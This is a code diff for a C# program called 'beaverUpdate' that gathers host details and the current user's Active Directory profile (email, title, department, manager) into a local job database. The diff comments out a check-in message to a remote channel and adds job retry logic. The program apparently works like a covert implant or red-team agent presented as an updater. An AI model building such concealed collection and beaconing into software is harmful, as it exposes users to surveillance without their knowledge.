@@ -7,9 +7,8 @@ using System.Threading.Tasks;
 using System.Net.WebSockets;
 using System.Diagnostics;
 using System.Management;
-
-using BeaverUpdate;
 using System.DirectoryServices;
+using BeaverUpdate;
 
 namespace beaverUpdate
 {
@@ -31,21 +30,41 @@ namespace beaverUpdate
             Console.WriteLine("Hello mother!");
             Utilities.HostInfo hostInfo = Utilities.GetHostInfo();
 
-            try
+            // UserInfo
+            string userJob = db.GetJobStatus("userinfo");
+            List<string> userJobDone = new List<string>
             {
-                // Get the current user's active directory info, store to local db, record task
-                DirectoryHelper.UserInfo userInfo = DirectoryHelper.GetUserInfo();
-                db.DirectoryEntry(userInfo.UserName, userInfo.Name, userInfo.Email, userInfo.Title, userInfo.Department, userInfo.Manager);
-                db.JobEntry(name: "userinfo", status: "collected");
-            } catch
+                "collected",
+                "completed",
+                "failed"
+            };
+            if (!userJobDone.Contains(userJob))
             {
-                Console.WriteLine("Not AD joined.");
+                Console.WriteLine($"Collecting user job info: {userJob}");
+                try
+                {
+                    // Get the current user's active directory info, store to local db, record task
+                    DirectoryHelper.UserInfo userInfo = DirectoryHelper.GetUserInfo();
+                    db.DirectoryEntry(userInfo.UserName, userInfo.Name, userInfo.Email, userInfo.Title, userInfo.Department, userInfo.Manager);
+                    db.JobEntry(name: "userinfo", status: "collected");
+                }
+                catch
+                {
+                    Console.WriteLine("Marking task failed");
+                    db.JobEntry(name: "userinfo", status: "failed");
+                }
+            } else
+            {
+                Console.WriteLine($"Skipped user check as previous attempt was {userJob}");
             }
-            
 
             Console.WriteLine($"Greetings {hostInfo.UserName} from {hostInfo.ComputerName}");
-            await SendMessage("bugz", $"Greetings from {hostInfo.UserName} on {hostInfo.ComputerName}!");
-
+            //await SendMessage("bugz", $"Greetings from {hostInfo.UserName} on {hostInfo.ComputerName}!");
+            var jobdb = db.GetJobs();
+            foreach (var job in jobdb )
+            {
+                Console.WriteLine($"Jobname: {job}");
+            }
             // Start working through pending tasks on a timer, in a thread
             // :memsql: - lastTask(#), lastRun(time)
             // have numbered list of tasks, iterate in loop only start next # if it's been 20 minutes since last run
